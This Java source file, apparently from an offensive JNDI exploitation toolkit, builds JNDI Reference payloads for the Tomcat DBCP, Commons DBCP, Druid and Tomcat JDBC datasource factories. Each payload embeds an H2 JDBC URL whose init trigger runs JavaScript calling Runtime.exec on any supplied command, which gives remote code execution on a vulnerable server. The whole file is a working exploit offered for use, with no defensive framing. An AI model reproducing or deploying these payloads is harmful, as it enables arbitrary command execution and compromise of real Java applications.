package com.bloom.payload;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class JDBCRce {

    public static Reference tomcat_dbcp2_RCE(String command){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",command);
    }
    public static Reference tomcat_dbcp1_RCE(String command){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",command);
    }
    public static Reference commons_dbcp2_RCE(String command){
        return dbcpByFactory("org.apache.commons.dbcp2.BasicDataSourceFactory",command);
    }
    public static Reference commons_dbcp1_RCE(String command){
        return dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory",command);
    }
    public static Reference druidjdbc(String command){
        return dbcpByFactory("com.alibaba.druid.pool.DruidDataSourceFactory",command);
    }
    public static Reference tomcatJDBC(String command){
        return dbcpByFactory("org.apache.tomcat.jdbc.pool.DataSourceFactory",command);
    }


    private static Reference dbcpByFactory(String factory,String command){
        Reference ref = new Reference("javax.sql.DataSource",factory,null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('"+command+"')\n" +
                "$$\n";
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("init","true"));
        ref.add(new StringRefAddr("username","root"));
        ref.add(new StringRefAddr("password","password"));
        ref.add(new StringRefAddr("initialSize","1"));
        return ref;
    }
}
